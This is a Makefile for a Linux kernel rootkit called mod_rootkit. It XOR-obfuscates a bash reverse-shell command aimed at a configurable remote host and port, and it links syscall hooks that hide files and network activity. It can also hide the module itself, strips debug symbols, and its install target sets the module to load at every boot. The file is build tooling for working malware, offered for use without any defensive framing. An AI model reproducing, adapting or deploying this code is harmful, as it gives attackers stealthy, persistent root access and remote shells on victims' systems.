# TODO prettify code here and comment
# TODO test empty rshell obf
# TODO xor all the rest and bin bash
# TODO refactor xor to a diff file
# TODO handle empty task not to return
# TODO section about obfuscation and stripping and using different function names with macros

MODULE_NAME := mod_rootkit

STRING_EXCLUDES ?=
NET_EXCLUDES ?=
HIDE_MODULE ?= 0

XOR_KEY := 0x5A
RSHELL_HOST ?=
RSHELL_PORT ?=



# ======================================================= XOR DEFINITIONS



# define function to XOR a string character-by-character
define xor_obfuscate
$(shell \
  STR="$1"; \
  i=1; \
  while [ $$i -le $$(printf '%s' "$$STR" | wc -c) ]; do \
    c=$$(printf '%s' "$$STR" | cut -b$$i); \
    printf "'\\x%02x', " $$(( $$(printf '%d' "'$$c") ^ $(XOR_KEY) )); \
    i=$$((i + 1)); \
  done; \
  echo "'\\x00'"; \
)
endef

# use function to obfuscate each string
STRING_EXCLUDES_OBF := $(call xor_obfuscate,$(STRING_EXCLUDES))
NET_EXCLUDES_OBF    := $(call xor_obfuscate,$(NET_EXCLUDES))

# no need to define RSHELL_CMD if rshell host / port are empty
ifneq ($(strip $(RSHELL_HOST)),)
  ifneq ($(strip $(RSHELL_PORT)),)
    RSHELL_CMD := bash -i >& /dev/tcp/$(RSHELL_HOST)/$(RSHELL_PORT) 0>&1
  else
    RSHELL_CMD :=
  endif
else
  RSHELL_CMD :=
endif

# obfuscate RSHELL_CMD
RSHELL_CMD_OBF := $(call xor_obfuscate,$(RSHELL_CMD))



# ======================================================= DEFINE SRC FILES 



obj-m += $(MODULE_NAME).o
$(MODULE_NAME)-objs := src/mod_rootkit.o \
                       src/tasks/task_manager.o \
                       src/tasks/reverse_shell.o \
                       src/hooks/x64_sys_getdents64.o \
                       src/hooks/x64_sys_read.o \
                       src/utils/encrypt_utils.o \
                       src/utils/ftrace_utils.o \
                       src/utils/kprobes_utils.o \
                       src/utils/proc_utils.o \
                       src/utils/excludes/net_filtering.o \
                       src/utils/excludes/string_filtering.o

EXTRA_CFLAGS += -I$(PWD)/include \
                -DMODULE_NAME=\"$(MODULE_NAME)\" \
                -DSTRING_EXCLUDES="{ $(STRING_EXCLUDES_OBF) }" \
                -DNET_EXCLUDES="{ $(NET_EXCLUDES_OBF) }" \
				-DRSHELL_CMD_OBF="{ $(RSHELL_CMD_OBF) }" \
				-DXOR_KEY=$(XOR_KEY)



# ======================================================= COMPILER FLAGS: HIDING MODULE



ifeq ($(HIDE_MODULE),1)
  EXTRA_CFLAGS += -DHIDE_MODULE
else ifneq ($(HIDE_MODULE),0)
  $(error Invalid value for HIDE_MODULE: '$(HIDE_MODULE)'. Use 0 or 1.)
endif



# ======================================================= COMPILER FLAGS: REMOVE DEBUG DATA 



EXTRA_CFLAGS += -O2 -fvisibility=hidden -fno-ident -fno-stack-protector -fno-asynchronous-unwind-tables



# ======================================================= MAKE ACTIONS 



all:
	@echo "[+] Building kernel module: $(MODULE_NAME).ko"
	@echo "    > HIDE_MODULE      = $(HIDE_MODULE)"
	@echo "    > STRING_EXCLUDES  = $(STRING_EXCLUDES)"
	@echo "    > NET_EXCLUDES     = $(NET_EXCLUDES)"
	@echo "    > RSHELL_HOST      = $(RSHELL_HOST)"
	@echo "    > RSHELL_PORT      = $(RSHELL_PORT)"
	@echo "    > MODULE_NAME      = $(MODULE_NAME)"
	@echo "    > Kernel Version   = $(shell uname -r)"
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	@echo "[*] Stripping symbols..."
	@strip --strip-unneeded $(MODULE_NAME).ko || echo "[!] strip failed"
	@echo "[+] Build complete."

clean:
	@echo "[~] Cleaning build artifacts for $(MODULE_NAME)..."
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
	@echo "[~] Clean done."

install:
	@echo "[+] Installing kernel module to system..."
	@echo "    > Target: /lib/modules/$(shell uname -r)/kernel/drivers/extra/$(MODULE_NAME).ko"
	sudo mkdir -p /lib/modules/$(shell uname -r)/kernel/drivers/extra
	sudo cp $(MODULE_NAME).ko /lib/modules/$(shell uname -r)/kernel/drivers/extra/
	sudo depmod -a
	@echo "[+] Creating auto-load config at /etc/modules-load.d/$(MODULE_NAME).conf"
	echo "$(MODULE_NAME)" | sudo tee /etc/modules-load.d/$(MODULE_NAME).conf > /dev/null
	@echo "[+] Module installed and set to auto-load at boot."
	@echo "[+] Loading module now..."
	sudo modprobe $(MODULE_NAME)
	@echo "[V] Module loaded into kernel."

uninstall:
	@echo "[-] Uninstalling kernel module: $(MODULE_NAME)"
	@echo "    > Attempting to unload from kernel (if loaded)..."
	@sudo modprobe -r $(MODULE_NAME) || echo "    > Module not loaded or already removed."

	@echo "    > Removing /lib/modules/$(shell uname -r)/kernel/drivers/extra/$(MODULE_NAME).ko"
	@sudo rm -f /lib/modules/$(shell uname -r)/kernel/drivers/extra/$(MODULE_NAME).ko

	@echo "    > Removing auto-load config at /etc/modules-load.d/$(MODULE_NAME).conf"
	@sudo rm -f /etc/modules-load.d/$(MODULE_NAME).conf

	@echo "    > Updating module dependencies..."
	@sudo depmod -a

	@echo "[V] Module $(MODULE_NAME) fully uninstalled."
